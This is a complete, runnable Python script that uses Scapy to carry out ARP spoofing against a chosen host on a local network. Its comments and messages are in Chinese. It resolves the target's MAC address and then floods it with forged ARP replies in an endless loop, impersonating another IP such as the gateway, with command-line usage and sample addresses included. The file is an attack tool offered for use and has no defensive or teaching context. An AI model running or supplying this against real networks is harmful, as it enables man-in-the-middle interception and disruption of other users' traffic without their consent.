from scapy.all import ARP, Ether, sendp, get_if_hwaddr, srp
import sys
import time

def get_mac(ip):
    """
    获取目标IP的MAC地址
    """
    # 发送ARP请求包，获取目标IP的MAC地址
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].src
    return None

def arp_spoof(target_ip, spoof_ip, interface="eth0"):
    """
    执行ARP欺骗
    :param target_ip: 目标主机的IP地址
    :param spoof_ip: 要伪装成的IP地址（通常是网关）
    :param interface: 网络接口名称，默认为eth0
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"无法获取 {target_ip} 的MAC地址")
        return

    # 构造ARP响应包，告诉目标主机我们是spoof_ip
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether_frame = Ether(dst=target_mac) / arp_response

    try:
        while True:
            # 持续发送ARP欺骗包
            sendp(ether_frame, iface=interface, verbose=False)
            print(f"[+] 发送ARP欺骗包: {spoof_ip} -> {target_ip}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] 停止ARP欺骗")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("用法: python arp_spoof.py <目标IP> <伪装IP> <网络接口>")
        print("例如: python arp_spoof.py 192.168.1.100 192.168.1.1 eth0")
        sys.exit(1)

    target_ip = sys.argv[1]
    spoof_ip = sys.argv[2]
    interface = sys.argv[3]

    arp_spoof(target_ip, spoof_ip, interface)